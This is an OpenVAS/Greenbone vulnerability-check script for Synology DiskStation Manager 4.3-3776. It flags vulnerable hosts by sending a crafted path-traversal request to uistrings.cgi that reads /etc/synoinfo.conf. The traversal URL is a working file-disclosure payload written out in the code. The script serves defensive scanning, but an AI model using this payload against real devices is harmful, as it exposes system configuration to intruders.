# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only
CPE = "cpe:/a:synology:diskstation_manager";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103787");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");

  script_name("Synology DSM 4.3-3776 XSS / File Disclosure / Command Injection");


  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/123182/Synology-DSM-4.3-3776-XSS-File-Disclosure-Command-Injection.html");
  script_xref(name:"URL", value:"http://www.synology.com/enu/index.php");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-09-12 11:33:59 +0200 (Thu, 12 Sep 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_synology_dsm_consolidation.nasl");
  script_require_ports("Services/www", 5000);
  script_mandatory_keys("synology/dsm/http/detected");

  script_tag(name:"impact", value:"Please see the references for details about the impact.");
  script_tag(name:"vuldetect", value:"Tries to read /etc/synoinfo.conf by sending a special crafted HTTP GET request.");
  script_tag(name:"insight", value:"Synology DSM versions 4.3-3776 and below suffer from remote file
download, content disclosure, cross site scripting, and command injection
vulnerabilities.");
  script_tag(name:"solution", value:"Vendor updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Synology DiskStation Manager is prone to multiple vulnerabilities.");
  script_tag(name:"affected", value:"Synology DSM versions 4.3-3776 and below.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/scripts/uistrings.cgi?lang=." + crap( data:"/", length:88 ) + crap( data:"../", length:3*5 ) + "etc/synoinfo.conf";

if( http_vuln_check( port:port, url:url, pattern:"secure_admin_port" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );

